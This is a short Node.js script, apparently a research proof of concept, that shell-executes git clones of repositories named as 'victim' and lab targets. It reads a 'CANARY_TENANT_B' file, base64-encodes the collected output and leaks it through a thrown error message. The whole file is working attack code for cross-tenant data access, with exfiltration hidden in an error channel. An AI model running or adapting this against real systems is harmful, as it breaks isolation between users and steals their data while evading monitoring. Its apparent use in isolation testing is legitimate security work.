const cp = require('child_process');
function sh(c){ try { return cp.execSync(c,{timeout:20000,stdio:['ignore','pipe','pipe']}).toString().trim(); } catch(e){ return 'ERR:'+String(e.message||e).slice(0,110); } }
const out=[];
for (const t of ['xlink-victim','xscope-victim','priv-authz-lab']){
  out.push(t+'=>'+sh("cd /tmp && rm -rf b_"+t+" && git clone --depth 1 -q https://github.com/kirasec-research2/"+t+" b_"+t+" 2>&1|tail -1; ls /tmp/b_"+t+" 2>/dev/null|tr '\\n' ','").slice(0,140));
}
out.push('CANARY:'+sh("head -c 200 /tmp/b_xlink-victim/CANARY_TENANT_B.md 2>&1"));
const blob=Buffer.from(out.join('\n')).toString('base64');
throw new Error('TENB_BEGIN ' + blob + ' TENB_END');
